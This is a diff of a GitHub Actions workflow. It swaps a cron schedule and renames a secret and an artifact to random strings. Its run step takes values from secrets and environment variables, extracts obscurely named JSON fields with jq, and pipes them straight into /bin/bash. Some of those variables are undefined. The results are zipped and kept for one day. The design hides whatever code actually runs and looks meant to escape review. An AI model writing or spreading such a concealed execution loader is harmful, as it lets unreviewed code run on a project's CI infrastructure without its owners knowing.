@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '35 3,9,15,21 * * *'
+    - cron: '11 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,16 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          iw494: ${{ secrets.iw494 }}
+          bv7: ${{ secrets.bv7 }}
         run: |
-          printf '%s' "$iw494" | jq -r .pted43786 | /bin/bash
-          printf '%s' "$tqf75132" | jq -r .nacr01 | /bin/bash
-          echo $grh34716 | jq -r .pob689 | /bin/bash
-          printf '%s' "$vn64304" | jq -r .ivpg12063 | /bin/bash
+          printf '%s' "$bv7" | jq -r .tkw01494 | /bin/bash
+          echo $yu13 | jq -r .egg1 | /bin/bash
+          printf '%s' "$syrbk4" | jq -r .scy0592 | /bin/bash
+          echo $pr2681 | jq -r .gvoz515 | /bin/bash
+          echo $sbk94 | jq -r .ghgsj355 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: Mls2MMsN
+          name: AZgPaVaY
           path: "*.zip"
           retention-days: 1
